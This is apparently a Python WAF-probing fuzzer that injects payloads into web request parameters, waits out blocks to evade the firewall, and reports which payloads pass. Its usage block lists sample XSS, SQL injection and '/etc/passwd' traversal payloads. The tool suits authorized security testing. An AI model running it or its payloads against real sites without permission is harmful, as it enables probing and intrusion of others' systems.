import copy
from random import randint
from time import sleep
from urllib.parse import unquote
import requests
import logging
from logger import setup_logger

logger = setup_logger()

class Fuzzer:
    def __init__(self, base_url, payloads, delay=0, timeout=10, WAF=False, encoding=None):
        self.base_url = base_url
        self.payloads = payloads
        self.delay = delay
        self.timeout = timeout
        self.WAF = WAF
        self.encoding = encoding

    def fuzz(self, url, params, headers, GET):
        for payload in self.payloads:
            t = self.delay + randint(self.delay, self.delay * 2)
            sleep(t)
            try:
                if self.encoding:
                    payload = self.encoding(unquote(payload))
                data = self.replace_value(params, payload)
                response = requests.get(url, params=data, headers=headers, timeout=self.timeout)
            except Exception as e:
                logger.error(f'WAF is dropping suspicious requests: {str(e)}')
                if self.delay == 0:
                    logger.info('Delay has been increased to 6 seconds.')
                    self.delay += 6
                limit = (self.delay + 1) * 50
                while limit > 0:
                    logger.info(f'Fuzzing will continue after {limit} seconds.')
                    sleep(1)
                    limit -= 1
                try:
                    requests.get(url, params=params, headers=headers, timeout=self.timeout)
                    logger.info('Phew! Looks like sleeping for a while worked!')
                except Exception as e:
                    logger.error('WAF has blocked our IP address. Sorry!')
                    break
            if self.encoding:
                payload = self.encoding(payload)
            if payload.lower() in response.text.lower():
                result = '[passed]'
            elif str(response.status_code).startswith('2'):
                result = '[filtered]'
            else:
                result = '[blocked]'
            logger.info(f'{result} {payload}')

    @staticmethod
    def replace_value(params, value):
        new_params = copy.deepcopy(params)
        for key in new_params:
            new_params[key] = value
        return new_params

# Usage example
if __name__ == "__main__":
    payloads = ['<script>alert(1)</script>', "' OR '1'='1", '../../etc/passwd']
    fuzzer = Fuzzer('http://example.com', payloads)
    fuzzer.fuzz('http://example.com/search', {'q': 'test'}, headers={}, GET=True)

